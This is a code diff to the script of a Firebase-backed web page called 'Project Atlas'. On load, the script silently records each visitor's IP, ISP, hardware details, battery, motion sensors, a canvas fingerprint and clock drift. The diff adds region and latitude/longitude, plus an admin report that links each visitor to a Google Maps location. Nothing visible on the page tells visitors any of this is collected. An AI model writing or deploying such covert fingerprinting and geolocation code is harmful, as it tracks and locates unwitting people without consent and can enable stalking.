@@ -101,7 +101,6 @@
         const auth = firebase.auth();
         const db = firebase.database();
 
-        // LIVE SENSOR CAPTURE
         let curMotion = "No Motion";
         window.addEventListener('deviceorientation', (e) => {
             curMotion = `P: ${Math.round(e.beta)}° | R: ${Math.round(e.gamma)}°`;
@@ -113,21 +112,18 @@
                 const data = await res.json();
                 const ip = data.ip;
 
-                // 1. Path Analysis (Network Distance to Montreal Edge)
                 const pStart = performance.now();
                 await fetch('https://www.google.com/generate_204', { mode: 'no-cors' });
                 const netPath = (performance.now() - pStart).toFixed(2);
 
-                // 2. Precise Clock Drift
                 const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                 const driftD = await driftRes.json();
                 const clockDrift = Date.now() - new Date(driftD.datetime).getTime();
 
-                // 3. Canvas Fingerprint (Hardware ID)
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.fillText("ProjectAtlas_Fingerprint", 10, 10);
-                const fingerprint = canvas.toDataURL().slice(-50, -10); // Simple hardware hash
+                const fingerprint = canvas.toDataURL().slice(-50, -10);
 
                 let bat = "N/A";
                 if(navigator.getBattery) {
@@ -137,7 +133,9 @@
 
                 db.ref("visits").push({
                     ip: ip,
-                    city: data.city,
+                    city: data.city || "Unknown",
+                    region: data.region || "Unknown", // Added Region for precision
+                    loc: data.loc, // Lat/Long for mapping
                     isp: data.org,
                     cpu: navigator.hardwareConcurrency || "N/A",
                     ram: navigator.deviceMemory || "N/A",
@@ -167,7 +165,6 @@
 
         runDiagnostics();
 
-        // UI SYNC
         db.ref("log").on("value", snap => {
             const d = snap.val() || {};
             document.getElementById("title").innerText = d.title || "Project Atlas";
@@ -175,7 +172,6 @@
             document.getElementById("tbody").innerHTML = d.table || "";
         });
 
-        // ADMIN LOGIC
         const modal = document.getElementById('loginModal');
         document.getElementById('adminToggle').onclick = () => modal.style.display = 'flex';
 
@@ -212,23 +208,30 @@
             });
         }
 
-        // THE INSPECTION BOARD
         async function inspect(key) {
             const snap = await db.ref("visits/" + key).once("value");
             const d = snap.val();
+            
+            // DYNAMIC PATH GENERATION: No longer hardcoded to Lachine
+            const dynamicPath = `${d.city}, ${d.region} -> Global Edge`;
+            const mapsUrl = `https://www.google.com/maps?q=${d.loc}`;
+
             alert(
                 `SENSOR FUSION REPORT [${d.ip}]\n` +
                 `------------------------------------\n` +
-                `NETWORK PATH: ${d.path} (Lachine -> Mtl)\n` +
+                `NETWORK PATH: ${d.path} (${dynamicPath})\n` +
                 `CLOCK DRIFT: ${d.drift}\n` +
                 `BATTERY: ${d.battery}\n` +
                 `MOTION: ${d.sensors}\n` +
                 `HARDWARE ID: ${d.hw_id}\n` +
                 `------------------------------------\n` +
+                `LOCATION: ${d.city.toUpperCase()}, ${d.region}\n` +
+                `MAP COORDS: ${d.loc}\n` +
                 `CPU: ${d.cpu} Core | RAM: ${d.ram}GB\n` +
                 `GPU: ${d.gpu}\n` +
                 `ISP: ${d.isp}\n` +
-                `USER-AGENT: ${d.ua}`
+                `------------------------------------\n` +
+                `View in Maps: ${mapsUrl}`
             );
         }
 
